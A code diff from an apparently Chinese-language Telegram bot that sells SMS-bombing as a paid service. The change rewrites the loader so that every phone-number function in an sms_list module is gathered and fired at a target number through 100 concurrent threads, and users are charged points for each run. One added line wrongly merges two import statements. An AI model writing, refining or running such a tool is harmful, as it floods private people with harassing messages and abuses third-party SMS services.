@@ -9,9 +9,9 @@ import itertools
 import binascii
 import random
 import concurrent.futures
-import sms_list  # 修改：更标准的导入方式
-from sms_list import * 
-from Crypto.Cipher import DES3
+import inspect  # 新增：用于深度扫描接口
+import sms_list 
+from sms_list import * from Crypto.Cipher import DES3
 from datetime import datetime
 from telebot import types
 from concurrent.futures import ThreadPoolExecutor
@@ -231,29 +231,25 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
     except: pass
     bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')
 
-# ================= 5. 指令与消息处理 =================
+# ================= 5. 核心：接口加载器 =================
 
 def get_all_senders():
-    """✨全量抓取：不再靠关键词，而是遍历整个模块的所有可调用函数"""
+    """✨ 全量加载：扫描 sms_list.py 中所有带手机号参数的函数"""
     all_funcs = []
-    # 排除掉 sms_list 里的系统内置变量和配置变量
-    exclude_list = [
-        'requests', 'json', 'time', 'random', 'hashlib', 're', 'threading', 'sys',
-        'exit_flag', 'print_lock', 'PLATFORM_THREAD_POOL_SIZE', 'PLATFORM_REQUESTS_PER_SECOND',
-        'MINUTE_TASK_MAX_THREADS', 'MINUTE_CYCLE_DURATION', 'platform_executor',
-        'platform_request_worker', 'send_minute_request', 'generate_random_user_agent'
-    ]
+    # 排除不需要执行的辅助函数或内置变量
+    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request']
     
-    # 遍历 sms_list 模块中的所有属性
-    for attr_name in dir(sms_list):
-        if attr_name.startswith("__") or attr_name in exclude_list:
-            continue
-            
-        attr_obj = getattr(sms_list, attr_name)
-        # 只要是函数，且不是被排除的辅助工具，就加入大炮清单
-        if callable(attr_obj):
-            all_funcs.append(attr_obj)
-            
+    # 获取 sms_list 中的所有成员
+    for name, obj in inspect.getmembers(sms_list):
+        # 只要是函数，且不在排除名单里
+        if inspect.isfunction(obj) and name not in excludes:
+            try:
+                # 进一步验证：函数必须能接收一个参数（手机号）
+                sig = inspect.signature(obj)
+                if len(sig.parameters) >= 1:
+                    all_funcs.append(obj)
+            except:
+                pass
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
@@ -267,15 +263,15 @@ def sms_bomb_cmd(message):
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
     
-    # 核心修改：使用新的全量抓取逻辑
+    # 动态获取当前所有可用接口
     all_funcs = get_all_senders()
-    bot.reply_to(message, f"🎯 **已加载接口：{len(all_funcs)}个**\n正在对 `{target}` 开启火力覆盖...", parse_mode='Markdown')
+    bot.reply_to(message, f"🎯 **已激活接口：{len(all_funcs)}个**\n正在对 `{target}` 开启火力覆盖...", parse_mode='Markdown')
     
     user_points[uid] -= 5.5; save_points()
 
     def do_bomb():
         random.shuffle(all_funcs)
-        # 接口多了，适当调高并发数到 100
+        # 接口多，并发数建议维持在 80-100 左右
         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
             for func in all_funcs:
                 executor.submit(func, target)
@@ -283,7 +279,8 @@ def sms_bomb_cmd(message):
     
     threading.Thread(target=do_bomb).start()
 
-# --- 后续管理指令保持不变 ---
+# ================= 6. 管理与业务指令 =================
+
 @bot.message_handler(commands=['hb'])
 def hb_cmd(message):
     if user_points.get(message.from_user.id, 0.0) < 5.5: return bot.reply_to(message, "积分不足，请先充值！")
